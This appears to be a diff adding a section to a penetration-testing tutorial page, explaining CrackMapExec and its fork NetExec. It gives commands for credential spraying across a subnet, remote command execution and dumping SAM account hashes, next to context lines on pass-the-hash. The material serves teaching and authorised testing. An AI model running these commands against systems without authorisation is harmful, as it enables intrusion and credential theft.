@@ -32,6 +32,31 @@ netstat -antp                       # what is THIS box already connected to?`}</
       <CodeBlock label="credential spraying across the internal subnet">{`crackmapexec smb 10.10.30.0/24 -u administrator -p 'CapturedPassword123!'
 # a hit means that same local admin password works on another host too`}</CodeBlock>
 
+      <h2>CrackMapExec and NetExec: the Swiss-army knife for credential validation</h2>
+      <p>
+        <strong>CrackMapExec</strong> (often abbreviated CME) became the standard tool for exactly the
+        credential-spraying workflow above — checking one set of credentials against an entire subnet over
+        SMB, WinRM, and other Windows management protocols in a single command, then using whatever hosts
+        say "yes" to execute commands, dump hashes, or enumerate shares. Its original development slowed
+        down, so the community forked it and now actively maintains the same tool under the name{' '}
+        <strong>NetExec</strong> (often invoked as <code>nxc</code>) — same core workflow, actively patched
+        and extended.
+      </p>
+      <CodeBlock label="NetExec: the modern CrackMapExec workflow">{`netexec smb 10.10.10.0/24 -u user -p pass
+# validates one credential pair against every host answering on SMB across the whole /24 in one pass
+
+netexec smb 10.10.10.0/24 -u user -p pass --local-auth -x "whoami"
+# on every host where those creds work, execute a command remotely and return the output
+
+netexec smb 10.10.10.5 -u user -p pass --sam
+# dump the local SAM database (local account hashes) from a host you've authenticated to`}</CodeBlock>
+      <p>
+        This single tool covers credential validation, spraying across a range, remote command execution,
+        and post-auth enumeration (shares, sessions, logged-on users) — which is why it's usually the very
+        first thing run against a subnet the moment any valid credential, even a low-privilege one, is
+        obtained.
+      </p>
+
       <h2>Lateral movement techniques</h2>
       <ul>
         <li><strong>Pass-the-hash</strong> — authenticate using a captured NTLM hash directly, without ever
